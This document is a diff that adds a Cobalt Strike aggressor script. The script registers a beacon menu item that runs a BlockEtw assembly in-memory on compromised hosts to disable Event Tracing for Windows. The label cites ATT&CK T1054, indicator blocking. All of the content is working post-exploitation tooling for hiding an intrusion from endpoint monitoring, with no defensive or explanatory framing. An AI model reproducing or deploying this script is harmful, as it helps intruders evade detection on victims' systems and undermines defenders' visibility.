@@ -1,0 +1,27 @@
+#################################################
+
+#   Begin blocking ETW https://github.com/Soledge/BlockEtw
+
+#################################################
+
+# Block ETW
+item "Disable ETW in current process - T1054"{
+
+    local('$bid');
+        foreach $bid ($1){
+            blocketw($bid);
+      }
+
+    }
+    
+    
+    
+#################################################
+
+#   ETW
+
+#################################################          
+sub blocketw{
+blog($bid, "Blocking ETW with - https://github.com/Soledge/BlockEtw");
+bexecute_assembly($1, script_resource('exe/blocketw.exe'));
+}
